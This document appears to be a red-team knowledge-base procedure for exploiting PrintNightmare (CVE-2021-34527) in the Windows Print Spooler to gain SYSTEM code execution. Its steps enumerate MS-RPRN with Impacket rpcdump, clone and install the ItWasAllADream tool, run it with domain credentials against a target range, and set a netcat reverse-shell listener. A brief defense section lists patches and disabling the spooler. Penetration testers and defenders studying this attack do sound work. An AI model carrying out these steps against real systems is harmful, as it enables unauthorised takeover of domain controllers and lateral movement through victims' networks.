---
type: procedure
description: >-
  Exploit the PrintNightmare vulnerability in the Windows Print Spooler service
  to achieve remote code execution with SYSTEM privileges using RPC enumeration
  and a specialized exploitation tool.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/From CVE to SYSTEM shell on DC]]'
  - '[[tags/PrintNightmare]]'
commands:
  - '[[commands/clone-itwasalladream-repository]]'
  - '[[commands/install-itwasalladream-dependencies]]'
  - '[[commands/rpcdump-filter-ms-rprn-ms-par]]'
  - '[[commands/run-itwasalladream-locally]]'
  - '[[commands/run-itwasalladream-docker]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
  - '[[tools/itwasalladream]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# PrintNightmare-Remote-Code-Execution

## Summary

This procedure exploits the PrintNightmare vulnerability (CVE-2021-34527) in the Windows Print Spooler service to achieve remote code execution with SYSTEM privileges. It begins by enumerating RPC interfaces to confirm vulnerability exposure, then uses the ItWasAllADream tool to send crafted RPC calls over MS-RPRN, enabling arbitrary code execution on domain controllers or other Windows targets. This is particularly effective in Active Directory environments for lateral movement from initial foothold to high-privilege access.

## Description

PrintNightmare allows attackers with network access to a vulnerable Windows system (unpatched or misconfigured Print Spooler) to execute code by abusing the Remote Procedure Call (RPC) interface for print spooler management. The vulnerability stems from improper validation in the spoolss.dll handling of RPC requests, specifically via the MS-RPRN protocol. This procedure assumes authenticated access (domain credentials) and targets Windows Server 2019/2022 or Windows 10/11 with Spooler service enabled. Success grants SYSTEM shell, enabling persistence, data exfiltration, or further lateral movement. Use in controlled red team exercises only; patching (KB5005010+) mitigates this.

## Requirements

1. Network access to the target Windows system (TCP/445 for RPC over SMB).
2. Valid domain credentials (username, password) for authentication.
3. Impacket suite installed for RPC enumeration.
4. ItWasAllADream tool set up (via Poetry or Docker).
5. Vulnerable target: Windows with Print Spooler service running and unpatched for PrintNightmare.
6. Attacker machine on Linux (Kali recommended) with Python 3 and Git.

## Defense

- Apply Microsoft patches (e.g., KB5005010 for initial fix, follow-up KBs for auth bypass variants).
- Disable Print Spooler service on non-printing servers: `sc config spooler start= disabled`.
- Restrict RPC endpoints: Use Group Policy to limit MS-RPRN access.
- Monitor for anomalous RPC traffic to port 445, especially Print Spooler-related calls.
- Enable Windows Event Logging for PrintService (Event ID 316) and audit failed RPC authentications.

## Objectives

1. Confirm exposure of vulnerable RPC protocols (MS-RPRN, MS-PAR) on the target.
2. Authenticate and exploit the Print Spooler RPC interface to execute arbitrary code.
3. Achieve SYSTEM-level shell for privilege escalation or lateral movement.
4. Verify exploitation success via command execution or reverse shell.

## Instructions

### Step 1: Enumerate RPC Interfaces for Vulnerability Confirmation

**Context**: Use Impacket's rpcdump to query the target's RPC endpoints and filter for Print Spooler-related protocols (MS-RPRN and MS-PAR). This confirms the service is exposed and vulnerable before attempting exploitation. Run this from your attacker machine with network access to the target.

**Command** ([[commands/rpcdump-filter-ms-rprn-ms-par]]):
```bash
python3 ./rpcdump.py @$_TARGET_IP | egrep 'MS-RPRN|MS-PAR'
```

> This command dumps all RPC interfaces on the target IP and filters output to show only relevant protocols. Replace $_TARGET_IP with the target's IP (e.g., 10.10.10.10). Expected output includes protocol details like "Protocol: [MS-RPRN]: Print System Remote Protocol", indicating vulnerability exposure. If no output, the target may be patched or Spooler disabled—abort exploitation.

### Step 2: Clone and Set Up ItWasAllADream Tool

**Context**: Download and prepare the ItWasAllADream exploitation tool, which automates PrintNightmare attacks via crafted RPC calls. This step installs dependencies using Poetry for local execution.

**Command** ([[commands/clone-itwasalladream-repository]]):
```bash
git clone https://github.com/byt3bl33d3r/ItWasAllADream
```

> Clones the repository to your current directory. Expected output: Progress messages ending with "Cloning into 'ItWasAllADream'..." and a success confirmation.

**Command** ([[commands/install-itwasalladream-dependencies]]):
```bash
cd ItWasAllADream && poetry install && poetry shell
```

> Navigates to the tool directory, installs Python dependencies via Poetry, and activates the virtual environment. Expected output: Installation logs for packages like impacket, and a shell prompt change indicating activation (e.g., "(ItWasAllADream-py3.10)"). If Poetry is not installed, run `pip install poetry` first.

### Step 3: Execute PrintNightmare Exploitation Locally

**Context**: Run the ItWasAllADream tool with provided credentials against the target to trigger RCE. This sends authenticated RPC requests to exploit the Spooler, executing a payload (e.g., reverse shell) with SYSTEM privileges.

**Command** ([[commands/run-itwasalladream-locally]]):
```bash
itwasalladream -u $_USERNAME -p $_PASSWORD -d $_DOMAIN $_TARGET_CIDR
```

> Executes the exploit locally in the activated environment. Parameters: $_USERNAME (e.g., user), $_PASSWORD (e.g., Password123), $_DOMAIN (e.g., domain.local), $_TARGET_CIDR (e.g., 10.10.10.10/24 for scanning range). Expected output: Enumeration of targets, then exploitation logs like "Adding printer driver... Executing payload..." followed by successful RCE confirmation (e.g., shell prompt or command output). Set up a listener (e.g., nc -lvnp 4444) if using reverse shell payload.

### Step 4: Alternative Execution in Docker (Optional)

**Context**: If local setup fails (e.g., dependency issues), run the tool in a Docker container for isolation. This bypasses Poetry but requires Docker installed.

**Command** ([[commands/run-itwasalladream-docker]]):
```bash
docker run -it itwasalladream -u $_USERNAME -p $_PASSWORD -d $_DOMAIN $_TARGET_IP
```

> Pulls and runs the pre-built ItWasAllADream Docker image. Parameters same as local run, but use single IP ($_TARGET_IP) instead of CIDR. Expected output: Similar to local execution, with container logs showing RPC interaction and RCE success. Use `-v` for volume mounts if needed for payloads.
